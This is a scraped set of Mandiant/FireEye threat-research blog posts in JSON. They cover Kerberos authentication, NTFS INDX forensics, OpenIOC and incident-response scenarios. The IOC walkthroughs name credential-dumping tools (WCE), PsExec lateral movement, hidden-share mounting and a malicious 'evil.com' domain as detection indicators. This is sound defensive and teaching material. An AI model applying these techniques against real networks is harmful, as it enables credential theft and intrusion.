performed in the Silver Ticket attack. To prevent this from easily happening, the Domain Controller encrypts the service ticket with the Kerberos key of the computer the user is authenticating to. All domain-joined computers in Active Directory possess a randomly generated computer account credential that both the computer and Domain Controller are aware of. The Domain Controller also generates a second session key specific to the service ticket and places a copy in both the encrypted service ticket and a new Authenticator structure. This Authenticator is encrypted with the first session key (the TGT session key). The service ticket, Authenticator, and metadata are bundled in a TGS-REP packet and forwarded back to the user. An example TGS-REP packet is shown in Figure 8. Figure 8: TGS-REP Once Windows receives the TGS-REP for cifs/SQLSERVER.ACMENET.CORP, Windows extracts the service ticket from the packet and caches it into memory. It also decrypts the Authenticator with the TGT specific session key to obtain the new service specific session key. Using both pieces of information, it is now possible for the user to authenticate to the remote file share. Windows negotiates a SMB connection with SQLSERVER.ACMENET.CORP. It places a Kerberos blob in an \"ap-req\" structure. This Kerberos blob includes the service ticket received from the domain controller, a new Authenticator structure, and metadata. The new Authenticator is encrypted with the service specific session key that was previously obtained from the Domain Controller. The authentication process is shown in Figure 9. Figure 9: Authenticating to SMB (AP-REQ) Once the file share server receives the authentication request, it first extracts and decrypts the service ticket from the Kerberos authentication blob and verifies the data within. It also extracts the service specific session key from the service ticket and attempts to decrypt the Authenticator with it. If this operation succeeds, the user is considered to be authenticated to the service. The server will acknowledge the successful authentication by sending one final Authenticator back to the user, encrypted with the service specific session key. This action completes the mutual authentication process. The response (contained within an “ap-rep” structure) is shown in Figure 10. Figure 10: Final Authenticator (Mutual Authentication, AP-REP) A diagram of the authentication flow is shown in Figure 11. Figure 11: Example Kerberos authentication flow Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/03/citrix_xenapp_andxe.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-03-15",
                    "source": "www.fireeye.com"
                },
                "text": "A Joint Whitepaper from Mandiant and Citrix Throughout the course of Mandiant’s Red Team and Incident Response engagements, we frequently identify a wide array of misconfigured technology solutions, including Citrix XenApp and XenDesktop. We often see attackers leveraging stolen credentials from third parties, accessing Citrix solutions, breaking out of published applications, accessing the underlying operating systems, and moving laterally to further compromise the environment. Our experience shows that attackers are increasingly using Citrix solutions to remotely access victim environments post-compromise, instead of using traditional backdoors, remote access tools, or other types of malware. Using a legitimate means of remote access enables attackers to blend in with other users and fly under the radar of security monitoring tools. Citrix provides extensive security hardening guidance and templates to their customers to mitigate the risk of these types of attacks. The guidance is contained in product-specific eDocs, Knowledge Base articles and detailed Common Criteria configurations. System administrators (a number of them wearing many hats and juggling multiple projects) may not have the time to review all of the hardening documentation available, so Mandiant and Citrix teamed up to provide guidance on the most significant risks posed to Citrix XenApp and XenDesktop implementations in a single white paper. This white paper covers risks and official Citrix hardening guidance for the following topics: Environment and Application Jailbreaking Network Boundary Jumping Authentication Weaknesses Authorization Weaknesses Inconsistent Defensive Measures Non-configured or Misconfigured Logging and Alerting The white paper is available here. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/01/leveraging-power-solutions-intelligence.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-01-27",
                    "source": "www.fireeye.com"
                },
                "text": "Welcome to my first post as a FireEye™ employee! Many of you have asked me what I think of FireEye's acquisition of Mandiant. One of the aspects of the new company that I find most exciting is our increased threat intelligence capabilities. This post will briefly explore what that means for our customers, prospects, and the public. By itself, Mandiant generates threat intelligence in a fairly unique manner from three primary sources. First, our professional services division learns about adversary tools, tactics, and procedures (TTPs) by assisting intrusion victims. This \"boots on the ground\" offering is unlike any other, in terms of efficiency (a small number of personnel required), speed (days or weeks onsite, instead of weeks or months), and effectiveness (we know how to remove advanced foes). By having consultants inside a dozen or more leading organizations every week of the year, Mandiant gains front-line experience of cutting-edge intrusion activity. Second, the Managed Defense™ division operates our software and provides complementary services on a multi-year subscription basis. This team develops long-term counter-intrusion experience by constantly assisting another set of customers in a managed security services model. Finally, Mandiant's intelligence team acquires data from a variety of sources, fusing it with information from professional services and managed defense. The output of all this work includes deliverables such as the annual M-Trends report and last year's APT1 document , both of which are free to the public. Mandiant customers have access to more intelligence through our software and services. As a security software company, FireEye deploys powerful appliances into customer environments to inspect and (if so desired) quarantine malicious content. Most customers choose to benefit from the cloud features of the FireEye product suite . This decision enables community self-defense and exposes a rich collection of the world's worst malware. As millions more instances of FireEye's MVX technology expand to mobile, cloud and data center environments, all of us benefit in terms of protection and visibility. Furthermore, FireEye's own threat intelligence and services components generate knowledge based on their visibility into adversary software and activity. Recent examples include breaking news on Android malware, identifying Yahoo! systems serving malware, and exploring \"cyber arms\" dealers. Like Mandiant, FireEye's customers benefit from intelligence embedded into the MVX platforms. Many have looked at the Mandiant and FireEye combination from the perspective of software and services. While these are important, both ultimately depend on access to the best threat intelligence available. As a combined entity, FireEye can draw upon nearly 2,000 employees in 40 countries, with a staff of security consultants, analysts, engineers, and experts not found in any other private organization. Stay tuned to the FireEye and Mandiant blogs as we work to provide an integrated view of adversary activity throughout 2014. I hope you can attend the FireEye + Mandiant - 4 Key Steps to Continuous Threat Protection webinar on Wednesday, Jan 29 at 2pm ET. During the webinar Manish Gupta, FireEye SVP of Products, and Dave Merkel, Mandiant CTO and VP of Products will discuss why traditional IT security defenses are no longer the safeguards they once were and what's now needed to protect against today's advanced threats. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/09/history-openioc.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-09-17",
                    "source": "www.fireeye.com"
                },
                "text": "With the buzz in the security industry this year about sharing threat intelligence, it's easy to get caught up in the hype, and believe that proper, effective sharing of Indicators or Intelligence is something that can just be purchased along with goods or services from any security vendor. It's really a much more complex problem than most make it out to be, and one that we've been working on for a while. A large part of our solution for managing Threat Indicators is using the OpenIOC standard format. Since its founding, Mandiant sought to solve the problem of how to conduct leading-edge Incident Response (IR) - and how to scale that response to an entire enterprise. We created OpenIOC as an early step in tackling that problem. Mandiant released OpenIOC to the public as an Open Source project under the Apache 2 license in November of 2011, but OpenIOC had been used internally at Mandiant for several years prior. IR is a discipline that usually requires highly trained professionals doing very resource-intensive work. Traditionally, these professionals would engage in time-intensive investigations on only a few hosts on a compromised network. Practical limitations on staffing, resources, time, and money would prevent investigations from covering anything other than a very small percentage of most enterprises. Responders would only be able to examine what they had direct access to, with their corresponding conclusions constrained by time and budget. This level of investigation was almost never enough to give confidence on anything other than the hosts that had been examined - responders were unable to confirm whether other systems were still compromised, or whether the adversary still had footholds in other parts of the network. Creating a standard way of recording Threat Intelligence into an Indicator was part of what allowed Mandiant to bring a new approach to IR, including the use of an automated solution, such as Mandiant for Intelligent Response® (MIR®) . Mandiant's new strategy for IR enabled investigators, who previously could only get to a few hosts in an engagement, to now query entire enterprises in only slightly more time. Using OpenIOC as a standardized format, the Indicators of Compromise (IOCs) were recorded once, and then used to help gather the same information and conduct the same testing on every host across the enterprise via the automated solution. Incident Responders could now spend only a little more time, but cover an exponentially larger number of hosts during the course of an investigation. Recording the IOCs in OpenIOC had other benefits as well. Indicators from one investigation could be shared with other investigations or organizations, and allow investigators to look for the exact same IOCs wherever they were, without having to worry about translation problems associated with ambiguous formats, such as lists or text documents. One investigator could create an IOC, and then share it with others, who could put that same IOC into their investigative system and look for the same evil as the first person, with little to no additional work. The format grew organically over time. We always intended that the format be expandable and improvable. Instead of trying to map out every possible use case, Mandiant has updated the format and expanded the dictionaries of IOC Terms as new needs have arisen over time. The version we released in 2011 as \"1.0\" had already been revised and improved upon internally several times before its Open Source debut. We continue to update the standard as needed, allowing for features and requests that we have received over time from other users or interested parties. Unlike traditional \"signatures,\" OpenIOC provides the ability to use logical comparison of Indicators in an IOC, providing more flexibility and discrimination than simple lists of artifacts. An extensive library of Indicator Terms allows for a variety of information from hosts and networks to be recorded, and if something is not covered in the existing terms, additional terms may be added. Upcoming features like parameters will allow for further expansion of the standard, including customization for application or organization specific use cases. Having the OpenIOC standard in place is tremendously powerful, providing benefits for scaling detection and investigation, both of which are key parts of managing the threat lifecycle. OpenIOC enables easy, standardized information sharing once implemented, without adding much to workloads or draining resources. And it is freely available as Open Source; so that others can benefit from some of the methods we have already found to work well in our practice. We hope that as we improve it, you can take even more advantage of what OpenIOC has to offer in your IR and Threat Intelligence workflows. Next up in the Back to Basics: OpenIOC series, we'll talk about some of the basics of what OpenIOC is and what using it involves - and some of the upcoming things in the future of OpenIOC. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/06/utilities-industry-cyber-targeting-scope.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-06-17",
                    "source": "www.fireeye.com"
                },
                "text": "There's often a lot of rhetoric in the press and in the security community around threats to the utilities industry, and risk exposure surrounding critical infrastructure. We've determined that the utilities industry (power, water, waste) has been, and likely will continue to be, a target for cyber espionage primarily from Chinese APT groups. We also anticipate that U.S. utilities infrastructure is vulnerable to computer network attack (CNA) from a variety of threat actors motivated by a desire to disrupt, deny access, or destroy. It's important to recognize the difference between actors seeking to steal data or intellectual property, and actors seeking to destroy systems or cause mass destruction. Often the distinction between computer network exploitation (CNE) and CNA gets lost in media coverage that bundles diverse cyber activity together. The type of cyber activity has implications for how we tackle the problem, thus it's key to distinguish. As part of our incident response and managed defense work, Mandiant has observed Chinese APT groups exploiting the computer networks of U.S. utilities enterprises servicing or providing electric power to U.S. consumers, industry, and government. The most likely targeted information for data theft in this industry includes smart grid technologies, water and waste management expertise, and negotiations information related to existing or pending deals involving Western utilities companies operating in China. Why would Chinese APT Groups Seek to Exploit Utilities? Since 2010, Mandiant has responded to what we assessed were Chinese cyber espionage incidents occurring at multiple utilities companies involved in electric power generation. We recognize the PRC's utilities sector for electric power development, construction, operations, and distribution is heavily concentrated on a select few state-owned enterprises (SOE) with close ties to the central government. We suspect these relationships provide APT groups with a fundamental incentive to conduct espionage to attain advanced technology and operations expertise. By way of possible motivation, the PRC is in the midst of a historic makeover that involves the transformation of urban infrastructures, which, by 2025, is likely to produce 15 mega-cities with an average of 25 million inhabitants, or about the entire population of the United States. [i] The impacts from this transition are intensifying pressures on an already fragile and outdated utilities infrastructure in China that currently struggles to provide sufficient electric power, water, and waste treatment. We believe APT groups are stealing data that will allow them to improve historic PRC urbanization efforts and the modernization of infrastructure, which is receiving billions of government investment dollars for development. While we have tracked multiple attributed Chinese APT groups active in the utilities industries, we certainly don't discount that other, non-Chinese state-sponsored (or independent) actors could be engaged in data theft related to utilities. The Risk of Disruptive Cyber Attacks Computer network attacks (CNA) - that is, offensive cyber operations meant to disrupt or destroy-are also a threat to the utilities industry from state actors in times of major conflict. Perpetrators may include hostile adversaries, possibly nation-states, during times of escalated tensions, or terrorist operatives who gain the required expertise. The threat of a state-sponsored actor or proxy targeting this industry using CNA is a growing concern, particularly in the case of Iran, though wide-scale data theft is the primary type of threat we've observed to this point. Several large US news outlets did recently report that Iranian-based actors infiltrated some of the US' industrial control systems, however, and some have speculated their motivation in doing so was to map the network or identify resources for future attack scenarios. For more intelligence reporting and specific details related to data theft in the utilities industry, the involved actors, and other threats, consider subscribing to the Mandiant Intelligence Center . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2012/09/striking-gold-incident-response-ntfs-indx-buffers-part-1.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2012-09-18",
                    "source": "www.fireeye.com"
                },
                "text": "By William Ballenthin & Jeff Hamm On August 30, 2012, we presented a webinar on how to use INDX buffers to assist in an incident response investigation. During the Q&A portion of the webinar we received many questions; however, we were not able to answer all of them. We're going to attempt to answer the remaining questions by posting a four part series on this blog. This series will address: Part 1: Extracting an INDX Attribute Part 2: The Internal Structures of a File Name Attribute Part 3: A Step by Step Guide to Parse INDX Part 4: The Internal Structures of an INDX Structure Part 1: Extracting an INDX Record An INDX buffer in the NTFS file system tracks the contents of a folder. INDX buffers can be resident in the $MFT (Master File Table) as an index root attribute (attribute type 0x90) or non-resident as an index allocation attribute (attribute 0xA0) (non-resident meaning that the content of the attribute is in the data area on the volume.) INDX root attributes have a dynamic size in the MFT, so as the contents change, the size of the attributes change. When an INDX root attribute shrinks, the surrounding attributes shift and overwrite any old data. Therefore, it is not possible to recover slack entries from INDX root attributes. On the other hand, the file system driver allocates INDX allocation attributes in multiples of 4096, even though the records may only be 40 bytes. As file system activity adds and removes INDX records from an allocation attribute, old records may still be recoverable in the slack space found between the last valid entry and the end of the 4096 chunk. This is very interesting to a forensic investigator. Fortunately, many forensic tools support extracting the INDX allocation attributes from images of an NTFS file system. Scenario Let's say that during your investigation you identified a directory of interest that you want to examine further. In the scenario we used during the webinar, we identified a directory as being of interest because we did a keyword search for \"1.rar\". The results of the search indicated that the slack space of an INDX attribute contained the suspicious filename \"1.rar\". The INDX attribute had the $MFT record number 49. Before we can parse the data, we need to extract the valid index attribute's content. Using various forensic tools, we are capable of this as demonstrated below. The SleuthKit We can use the SleuthKit tools to extract both the INDX root and allocation data. To extract the INDX attribute using the SleuthKit, the first step is to identify the $MFT record IDs for the attributes of the inode. We want the content of the index root attribute (attribute type 0x90 or 144d) and the index allocation attribute (attribute type 0xA0 or 160d). To identify the attribute IDs, run the command: istat -f ntfs ntfs.dd 49 The istat command returns inode information from the $MFT. In the command we are specifying the NTFS file system with the \"-f\" switch. The tool reads a raw image named \"ntfs.dd\" and locates record number 49. The result of our output (truncated) was as follows: .... Attributes: Type: $STANDARD_INFORMATION (16-0) Name: Resident size: 72 ... Type: $I30 (144-6) Name: $I30 Resident size: 26 Type: $I30 (160-7) Name: $I30 Non-Resident size: 4096 The information returned for the attribute list includes the index root - $I30 (144-6) - and an index allocation - $I30 (160-7). The attribute identifier is the integer listed after the dash. Therefore, the index root attribute 144 has an identifier of 6, and the index allocation attribute 160 has an identifier of 7. With this information, we can gather the content of the attributes with the SleuthKit commands: icat -f ntfs ntfs.dd 49-144-6 > INDX_ROOT.bin icat -f ntfs ntfs.dd 49-160-7 > INDX_ALLOCATION.bin The icat command uses the NTFS module to identify the record (49) attribute (144-6 and 144-7), and outputs the attribute data into the respective files INDX_ROOT.bin and INDX_ALLOCATION.bin. EnCase We can use EnCase to extract the INDX allocation data. To use EnCase version 6.x to gather the content of the INDX buffers, in the explorer tree, right click the folder icon. The \"Copy/UnErase...\" option applied to a directory will copy the content of the INDX buffer as a binary file. Specify a location to save the file. Note that the \"Copy Folders...\" option will copy the directory and its contents and will NOT extract the INDX structure. FTK We can use the Forensic Toolkit (FTK) to extract the INDX allocation data. Using FTK or FTK Imager, the INDX allocation attributes appear in the file list pane. These have the name \"$I30\" because the stream name is identified as $I30 in the index root and index allocation attributes. To extract the content of an index attribute, in the explorer pane, highlight the folder. In the file list pane, right click the relevant $I30 file and choose the option to \"export\". This will prompt you for a location to save the binary content. Mandiant Intelligent Response ® The Mandiant Intelligent Response ® (MIR) agent v.2.2 has the ability to extract INDX records natively. To generate a list of INDX buffers in MIR, run a RAW file audit. One of the options in the audit is to \"Parse NTFS INDX Buffers\". You can run this recursively, or you can target specific directories. We recommend the latter because this option will generate numerous entries when done recursively. To display a list of parsed INDX buffers, you can filter a file listing in MIR by choosing the \"FileAttributes\" are \"like\" \"*INDX*\". The MIR agent recognizes \"INDX\" as an attribute because the files listed in the indices may or may not be deleted. Results Regardless of which method is used, your binary file should begin with the string \"INDX\" if you grabbed the correct data stream. You can verify the results quickly in a hex editor. Ensure that the first four bytes of the binary data is the string \"INDX\". Conclusion This example demonstrates three ways to use various tools to extract INDX attribute content. Our next post will detail the internal structures of a file name attribute. A file name attribute will exist for each file tracked in a directory. These structures include the MACb (Modified, Accessed, Changed, and birth) times of a file and can be a valuable timeline source in an investigation. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2012/05/mtrends-1-malware-tells-story.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2012-05-14",
                    "source": "www.fireeye.com"
                },
                "text": "When I joined Mandiant earlier this year, I was given the opportunity to help write our annual M-Trends report . This is the third year Mandiant has published the report, which is a summary of the trends we've observed in our investigations over the last twelve months. I remember reading Mandiant's first M-Trends report when it came out in 2010 and recall being surprised that Mandiant didn't pull any punches. They talked about the advanced persistent threat or APT (they had been using that term for several years...long before it was considered a cool marketing, buzz word), and they were open about the origin of the attacks. The report summarized what I'd been seeing in industry, and offered useful insights for detection and response. Needless to say, I enjoyed the opportunity to work on the latest version. In this year's report it details six trends we identified in 2011. We developed the six trends for the report very organically. That is, I spent quite a few days and nights reading all of the reports from our outstanding incident response team and wrote about what we saw-we didn't start with trends and then look for evidence to support them. If you haven't picked up a copy of the report yet, you can do so here . I will be blogging on each of the six trends over the next two weeks; you can even view the videos we've developed for each trend as each blog post is published: Malware Only Tells Half the Story . Of the many systems compromised in each investigation, about half of them were never touched by attacker malware. In so many cases, the intruders logged into systems and took data from them (or used them as a staging point for exfiltration), but didn't install tools. It is ironic that the very systems that hold the data targeted by an attacker are probably the least likely to have malware installed on them. While finding the malware used in an intrusion is important, it is impossible to understand the full scope of an intrusion if this is the focal point of the investigation. We illustrate actual examples of this in the graphical spread on pages 6-7 of the report. What does this mean for victim organizations? You could start by looking for malware, but don't end there! A smart incident response process will seek to fully understand the scope of compromise and find all impacted systems in the environment. This could mean finding the registry entries that identify lateral movement, traces of deleted .rar files in unallocated space, or use of a known compromised account. It turns out that Mandiant has a product that does all of this, but the footnote on page 5 is the only mention you'll see in the entire report (and even that was an afterthought). Thoughts and questions about this trend or the M-Trends report? Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2012/04/executive-briefing-york-secretary-homeland-security.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2012-04-02",
                    "source": "www.fireeye.com"
                },
                "text": "On March 15, Mandiant hosted an executive briefing over breakfast in New York City. The location in the W Hotel in Downtown NYC overlooked the 9/11 Memorial and the rising One World Trade Center-an arresting view and a unique setting for this event. Former Secretary of Homeland Security Michael Chertoff kicked off the morning by discussing his perspective on the global threat landscape. He touched on Iran's cyber warfare capabilities in particular. He remarked on recent alleged Iranian attacks against the BBC and said that there is no point in debating the reality of cyber war . If one side believes they are engaged in such a battle, then that is reality-and \"Iran clearly believes they are already participants in cyber war.\" He also noted that Iran's capabilities are already quite advanced. After being hit by Stuxnet, Iran views it as imperative to be prepared to respond in kind. It is always nice to see someone like Mr. Chertoff connecting the dots so articulately on a technical level. At one point, he commented about how important it was to not just look for malware. Smart responders, he said, need to look for all trace evidence of compromise in order to fully understand the scope of an incident. Coincidentally, this is trend #1 in our recent M-Trends report , and Mr. Chertoff described the problem with a malware-centric approach perfectly. Richard Bejtlich spoke next and used a role-playing exercise to help the audience understand the challenge of responding to targeted threats. His premise was simple: \"Pretend I'm a law enforcement agent who comes to your office and tells you that you are compromised, and that I have your own internal documents as evidence. What do you do next?\" This provoked discussion and the audience started asking questions about the nature of the intrusion and what they should do to respond. As we explored the scenario through Q&A, it became clear that most organizations lack the visibility they need to adequately respond to attacks. What about your organization? If you found out today that you had been the victim of a substantial breach, where would you look first? How would you validate the intrusion? How could you discover the scopeor identify what had been stolen? Those of you who have attended Mandiant events know that we are pretty light on the product pitches (we often don't mention our products at all). However, we do have a product that helps answer the questions that Richard was posing. Mandiant Intelligent Response has helped hundreds of companies answer the question \"Now What??\" when they are on the receiving end of the scenario Richard outlined in New York. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/10/tactics-motives-services.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-10-08",
                    "source": "www.fireeye.com"
                },
                "text": "Every day at Mandiant we respond to some of the largest cyber security incidents around the world. This gives us a front-row seat to witness what works (and what doesn't) when it comes to finding attackers and preventing them from stealing our clients' data. Attackers' tactics and motives are evolving and as a result our security strategies also need to adapt. Today, we announced two new service offerings that will further help our clients improve their protective, detective, and responsive security controls and leverage Mandiant's extensive experience responding to some of the most serious cyber security incidents. Our first new service offering addresses attackers' expanding motives. We are starting to see attackers with destructive motives and what could be more damaging than attacking a nation's critical infrastructure. Security incidents at critical infrastructure such as electric power grids, utilities and manufacturing companies can affect the lives of hundreds of thousands of people. Our new Industrial Control Systems (ICS) Security Gap Assessment is specifically focused on helping these industries - and others that use SCADA systems - to assess their existing security processes for industrial control systems. The service helps identify security GAPs and provides specific recommendations to close those GAPs and safeguard critical infrastructure. Our second new service offering is designed to help organizations address the challenges they face as they build out their own internal security operations program and incident response teams. Many organizations want to enhance their internal capabilities beyond the traditional security operations centers (SOCs). Our new Cyber Defense Center Development service helps organizations evolve their internal SOC by improving the visibility (monitoring and detection) and response capabilities (incident response) necessary to defend against advanced threats. This service looks at existing people, process, and technologies and identifies areas for improvement. It helps companies to identify and prioritize the alerts that require the most immediate action with the goal to reduce the mean time to remediation. If either of these new services sound like something that could help your organization let us know . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-03-06",
                    "source": "www.fireeye.com"
                },
                "text": "Written by Will Gibb & Devon Kerr In our blog post \"Investigating with Indicators of Compromise (IOCs) - Part I ,\" we presented a scenario involving the \"Acme Widgets Co.,\" a company investigating an intrusion, and its incident responder, John. John's next objective is to examine the system \"ACMWH-KIOSK\" for evidence of attacker activity. Using the IOCs containing the tactics, techniques and procedures (TTPs) he developed during the analysis of \"ACM-BOBBO,\" John identifies the following IOC hits: Table 1: IOC hit summary After reviewing IOC hits in Redline™ , John performs Live Response and put together the following timeline of suspicious activity on \"ACMWH-KIOSK\". Table 2: Summary of significant artifacts John examines the timeline in order to surmise the following chain of activities: On October 15, 2013, at approximately 16:17:56 UTC, the attacker performed a type 3 network logon, described here , to \"ACMWH-KIOSK\" from \"ACM-BOBBO\" using the ACME domain service account, \"backupDaily.\" A few seconds later, the attacker copied two executables, \"acmCleanup.exe\" and \"msspcheck.exe,\" from \"ACM-BOBBO\" to \"C:$RECYCLE.BIN.\" By generating MD5 hashes of both files, John determines that \"acmCleanup.exe\" is identical to the similarly named file on \"ACM-BOBBO\", which means it won't require malware analysis. Since the MD5 hash of \"msspcheck.exe\" was not previously identified, John sends binary to a malware analyst, whose analysis reveals that \"msspcheck.exe\" is a variant of the \"acmCleanup.exe\" malware. About a minute later, at 16:19:02 UTC, the attacker executed the Sysinternals PsExec remote command execution utility, which ran for approximately three minutes. During this time period, event logs recorded the start and stop of the \"WCE SERVICE\" service, which corresponds to the execution of the Windows Credentials Editor (WCE). John can assume PsExec was used to execute WCE, which is reasonable given the timeline of events and artifacts present on the system. About seven minutes, later the registry recorded the modification of a Run key associated with persistence for \"msspcheck.exe.\" Finally, at 16:48:11 UTC, the attacker logged off from \"ACMWH-KIOSK\". John found no additional evidence of compromise. Since the IOCs are living documents, John's next step is to update his IOCs with relevant findings from his investigation of the kiosk system. John updates the \"acmCleanup.exe (BACKDOOR)\" IOC with information from the \"msspcheck.exe\" variant of the attacker's backdoor including: File metadata like filename and MD5. A uniquely named process handle discovered by John's malware analyst. A prefetch entry for the \"msspcheck.exe\" binary. Registry artifacts associated with persistence of \"msspcheck.exe.\" From there, John double-checks the uniqueness of the additional filename with some search engine queries. He can confirm that \"msspcheck.exe\" is a unique filename and update his \"acmCleanup.exe (BACKDOOR)\" IOC. By updating his existing IOC, John ensures that he will be able to identify evidence attributed to this specific variant of the backdoor. Changes to the original IOC have been indicated in green. The updated IOC can be seen below: Figure 1: Augmented IOC for acmCleanup.exe (BACKDOOR) John needs additional information before he can start to act. He knows two things about the attacker that might be able to help him out: The attacker is using a domain service account to perform network logons. The attacker has been using WCE to obtain credentials and the \"WCE SERVICE\" service appears in event logs. John turns to his security event and incident management (SEIM) system, which aggregates logs from his domain controllers, enterprise antivirus and intrusion detection systems. A search of type 3 network logons using the \"backupDaily\" domain account turns up 23 different systems accessed using that account. John runs another query for the \"WCE SERVICE\" and sees that logs from 3 domain controllers contain that service event. John needs to look for IOCs across all Acme machines in a short period of time. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-12-16",
                    "source": "www.fireeye.com"
                },
                "text": "Written by Devon Kerr & Will Gibb The Back to Basics: OpenIOC blog series previously discussed how Indicators of Compromise (IOCs) can be used to codify information about malware or utilities and describe an attacker's methodology. Also touched on were the parts of an IOC, such as the metadata, references, and definition sections. This blog post will focus on writing IOCs by providing a common investigation scenario, following along with an incident response team as they investigate a compromise and assemble IOCs. Our scenario involves a fictional organization, \"Acme Widgets Co.\", which designs, manufactures and distributes widgets. Last week, this organization held a mandatory security-awareness training that provided attendees with an overview of common security topics including password strength, safe browsing habits, email phishing and the risks of social media. During the section on phishing, one employee expressed concern that he may have been phished recently. Bob Bobson, an administrator, indicated that some time back he'd received a strange email about a competitor's widget and was surprised that the PDF attachment wouldn't open. A member of the security operations staff, John Johnson, was present during the seminar and quickly initiated an investigation of Bob's system using the Mandiant Redline™ host investigation tool. John used Redline to create a portable collectors configured to obtain live response data from Bob's system which included file system metadata, the contents of the registry, event logs, web browser history, as well as service information. John ran the collectors on Bob's system and brought the data back to his analysis workstation for review. Through discussions with Bob, John learned that the suspicious e-mail likely arrived on October 13, 2013. After initial review of the evidence, John assembled the following timeline of suspicious activity on the system. Table 1: Summary of significant artifacts Based on this analysis, John pieced together a preliminary narrative: The attacker sent a spear-phishing email to Bob which contained a malicious PDF attachment, \"Ultrawidget.pdf\", which Bob saved to the desktop on October 10, 2013, at 20:19:07 UTC. Approximately five minutes later, at 20:24:44 UTC, the file \"C:WINDOWSSysWOW64acmCleanup.exe\" was created as well as a Run key used for persistence. These events were likely the result of Bob opening the PDF. John sent the PDF to a malware analyst to determine the nature of the exploit used to infect Bob's PC. The first IOC John writes describes the malware identified on Bob's PC, \"acmCleanup.exe\", as well as the malicious PDF. IOCs sometimes start out as rudimentary - looking for the known file hashes, filenames and persistence mechanisms of the malware identified. Here is what an initial IOC looks like: Figure 1: Initial IOC for acmCleanup.exe (BACKDOOR) As analysis continues, these IOCs are updated and improved - incorporating indicator terms from malware and intelligence analysis as well as being refined based on the environment. In this sense, the IOC is a living document. For example, additional analysis may reveal more registry key information, additional files which may be written to disk, or information for identifying the malware in memory. Here is the same IOC, after augmenting it with the results of malware analysis: Figure 2: Augmented IOC for acmCleanup.exe (BACKDOOR) The augmented IOC will continue to identify the exact malware discovered on Bob's PC. This improved IOC will also identify malware which has things in common with that backdoor: Malware which uses the same Mutex, a process attribute that will prevent the machine from being infected multiple times with the same backdoor Malware which performs DNS queries for the malicious domain \"23vsx.evil.com\" Malware which has a specific set of import functions; in this case which correspond to reverse shell and keylogger functionality Beginning on October 11, the attacker accessed the system and executed the Windows command \"ipconfig\" at 20:24:00 UTC, resulting in the creation of a prefetch file. Approximately five minutes later, the attacker began uploading files to \"C:$RECYCLE.BIN\". Based on review of their MD5 hashes, three files (\"wce.exe\", \"getlsasrvaddr.exe\", \"update.exe\") were identified as known credential dumping utilities while others (\"filewalk32.exe\", \"rar.exe\") were tools for performing file system searches and creating WinRAR archives. These items should be recorded in an IOC, as a representation of an attacker's tools, techniques and procedures (TTPs). It is important to know that an attacker is likely to have interacted with many more systems than were infected with malware; for this reason it is crucial to look for evidence that an attacker has accessed systems. Some of the most common activities attackers perform on these systems include password-dumping, reconnaissance and data theft. Seeing that the attacker had staged file archives and utilities in the \"$Recycle.Bin\" folder, John also created an IOC to find artifacts present there. This IOC was designed to identify files in the root of the \"$Recycle.Bin\" directory; or to identify if a user (notably, the attacker) tried to access the \"$Recycle.Bin\" folder by manually typing it in the address bar of Explorer by checking TypedPaths in the Registry. This is an example of encapsulating an attacker's TTPs in an OpenIOC form. Figure 3: IOC for Unusual Files in \"C:RECYCLER\" and \"C:$RECYCLE.BIN\" (Methodology) On October 15, 2013, at 12:15:37 UTC, the Sysinternals PsExec utility was created in \"C:$RECYCLE.BIN\". Approximately four hours later, at 16:11:03 UTC, the attacker used the Internet Explorer browser to access text files located in \"C:$RECYCLE.BIN\". Between 16:11:03 UTC and 16:11:06 UTC, the attacker accessed two text files which were no longer present on the system. At 16:17:55 UTC, the attacker mounted the remote hidden share \"\\10.20.30.101C$\". At 16:20:29 UTC, the attacker executed the Windows \"tree\" command, resulting in the creation of a prefetch file, a command which produces a filesystem listing. At 17:37:37 UTC, the attacker created one WinRAR archive, \"C:$Recycle.Bina.rar\" which contained two text files, \"c.txt\" and \"a.txt\". These text files contained output from the Windows \"tree\" and \"ipconfig\" commands. No further evidence was present on the system. John noted that the earliest event log entries present on the system start approximately two minutes after the creation of \"a.rar\". It is likely that the attacker cleared the event logs before disconnecting from the system. John identified the lateral movement to the 10.20.30.101 host, from \"ACM-BOBBO\" through registry keys that recorded the mount of the hidden C$ share. By recording this type of artifact in an IOC, John will be able to quickly see if the attacker has pivoted to another part of the Acme Widgets Co. network when investigating 10.20.30.101. He included artifacts looking for other common hidden shares such as IPC$ and ADMIN$. The effectiveness of an IOC may be influenced by the environment the IOC was created for. This IOC, for example, may generate a significant number of false-positives in an environment where these hidden shares are legitimately used. At Acme Widgets Co., however, the use of hidden shares is considered highly suspicious. Figure 4 IOC for Lateral Movement 